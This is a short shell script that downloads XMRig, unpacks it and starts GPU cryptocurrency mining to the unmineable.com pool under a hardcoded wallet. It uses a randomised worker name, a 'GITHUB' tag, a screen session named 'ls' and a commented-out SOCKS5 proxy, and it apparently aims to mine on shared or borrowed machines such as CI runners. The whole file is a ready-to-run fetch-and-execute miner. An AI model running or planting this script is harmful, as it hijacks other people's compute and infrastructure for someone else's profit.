#!/bin/sh
apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz
tar xf xmrig-6.15.0-linux-x64.tar.gz
cd xmrig-6.15.0
screen -dmS ls 
WORKER=$(echo $(shuf -i 11111-9999999 -n 1)-GPU)
#PROXY=socks5://72.210.252.134:46164
./xmrig --opencl --cuda -o rx.unmineable.com:3333 -u BTT:TUyirySXd8brNTK5H5fpQySCsGwRoADhWK.GITHUB#qm1d-5eux -k